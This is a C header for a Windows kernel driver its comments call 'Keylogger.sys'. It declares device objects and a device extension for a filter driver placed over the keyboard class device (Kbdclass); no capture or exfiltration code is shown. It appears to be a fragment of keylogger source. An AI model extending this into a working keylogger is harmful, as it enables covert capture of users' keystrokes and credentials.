
#pragma once

#ifndef EXTENSION_H_
#define EXTENSION_H_

#include "pch.h"

static UNICODE_STRING uKeyboardHhk;	/* keyboard device symbolic link */
static UNICODE_STRING uDoS;			/* DoS */
static UNICODE_STRING uKeyboardDeviceTarget;

static PDEVICE_OBJECT pDevKbd;			/* Keylogger.sys(driver) device object */
static PDEVICE_OBJECT pKbdTarget;		/* target device object(Kbdclass) */

typedef struct DEVICE_EXTENSION {

	PDEVICE_OBJECT pLwkbd;					/* filter device object(FDO) */

}DEVICE_EXTENSION, *PDEVICE_EXTENSION;




#endif // !EXTENSION_H_
